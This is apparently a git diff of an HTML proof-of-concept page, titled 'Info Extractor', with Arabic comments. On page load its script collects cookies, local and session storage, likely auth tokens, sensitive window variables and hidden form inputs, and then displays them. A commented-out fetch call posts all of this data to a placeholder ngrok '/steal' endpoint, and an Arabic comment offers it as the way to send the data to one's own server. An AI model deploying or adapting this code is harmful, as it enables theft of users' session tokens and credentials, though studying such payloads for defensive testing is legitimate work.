@@ -1,89 +1,100 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>📊 Page Info</title>
+    <title>📊 Info Extractor</title>
     <script>
       window.onload = function () {
-  const url = document.location.href;
-  const cookies = document.cookie || "No cookies available";
-  const userAgent = navigator.userAgent;
+        const url = location.href;
+        const cookies = document.cookie || "❌ No cookies";
+        const userAgent = navigator.userAgent;
 
-  // طباعة محتوى localStorage و sessionStorage
-  let localStorageData = {};
-  for (let i = 0; i < localStorage.length; i++) {
-    const key = localStorage.key(i);
-    localStorageData[key] = localStorage.getItem(key);
-  }
+        // ⬇️ LocalStorage
+        const localStorageData = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          localStorageData[key] = localStorage.getItem(key);
+        }
 
-  let sessionStorageData = {};
-  for (let i = 0; i < sessionStorage.length; i++) {
-    const key = sessionStorage.key(i);
-    sessionStorageData[key] = sessionStorage.getItem(key);
-  }
+        // ⬇️ SessionStorage
+        const sessionStorageData = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          sessionStorageData[key] = sessionStorage.getItem(key);
+        }
 
-  const message = `📄 Page Info:
-URL: ${url}
+        // ⬇️ Tokens from localStorage/sessionStorage
+        const potentialTokens = {};
+        const allKeys = [...Object.keys(localStorageData), ...Object.keys(sessionStorageData)];
+        allKeys.forEach((key) => {
+          if (/token|auth|bearer/i.test(key)) {
+            potentialTokens[key] = localStorageData[key] || sessionStorageData[key];
+          }
+        });
 
-Cookies: ${cookies}
+        // ⬇️ Global variables from window
+        const sensitiveGlobals = {};
+        for (const key in window) {
+          if (/token|auth|user/i.test(key) && typeof window[key] === 'string') {
+            sensitiveGlobals[key] = window[key];
+          }
+        }
 
-User-Agent:
+        // ⬇️ Hidden input fields
+        const hiddenInputs = {};
+        document.querySelectorAll('input[type="hidden"]').forEach((el) => {
+          hiddenInputs[el.name || el.id || `input_${Math.random().toString(36).substr(2, 5)}`] = el.value;
+        });
+
+        // ⬇️ بناء الرسالة النهائية
+        const message = `
+📄 Page Info:
+
+🔗 URL: ${url}
+
+🍪 Cookies:
+${cookies}
+
+📱 User-Agent:
 ${userAgent}
 
-LocalStorage:
+📦 LocalStorage:
 ${JSON.stringify(localStorageData, null, 2)}
 
-SessionStorage:
+📥 SessionStorage:
 ${JSON.stringify(sessionStorageData, null, 2)}
+
+🕵️‍♂️ Potential Tokens / Auth Keys:
+${JSON.stringify(potentialTokens, null, 2)}
+
+🌐 Sensitive window variables:
+${JSON.stringify(sensitiveGlobals, null, 2)}
+
+🧪 Hidden Inputs:
+${JSON.stringify(hiddenInputs, null, 2)}
 `;
 
-  alert(message);
-};
+        // ⬇️ عرض البيانات
+        alert(message);
 
-//       window.onload = function () {
-//         const url = document.location.href;
-//         const cookies = document.cookie || "❌ No cookies available";
-//         const userAgent = navigator.userAgent;
-
-//         // محاولة قراءة localStorage و sessionStorage
-//         let localData = "❌ Not accessible";
-//         let sessionData = "❌ Not accessible";
-
-//         try {
-//           localData = JSON.stringify(localStorage, null, 2);
-//         } catch (e) {
-//           localData = "❌ Error reading localStorage";
-//         }
-
-//         try {
-//           sessionData = JSON.stringify(sessionStorage, null, 2);
-//         } catch (e) {
-//           sessionData = "❌ Error reading sessionStorage";
-//         }
-
-//         const message = `
-// 📄 Page Info:
-
-// 🔗 URL: ${url}
-
-// 🍪 Cookies:
-// ${cookies}
-
-// 📱 User-Agent:
-// ${userAgent}
-
-// 📦 Local Storage:
-// ${localData}
-
-// 📥 Session Storage:
-// ${sessionData}
-//         `;
-
-//         // عرض النتيجة في Alert
-//         alert(message);
-//       };
+        // 📤 لو عايز تبعت البيانات لسيرفرك:
+        /*
+        fetch("https://YOUR-NGROK-ID.ngrok-free.app/steal", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            url, cookies, userAgent,
+            localStorageData,
+            sessionStorageData,
+            potentialTokens,
+            sensitiveGlobals,
+            hiddenInputs
+          })
+        }).catch(console.error);
+        */
+      };
     </script>
   </head>
   <body>
-    <h1>👋 مرحباً بك في الصفحة</h1>
+    <h1>🧠 Page Data Extracted</h1>
   </body>
 </html>
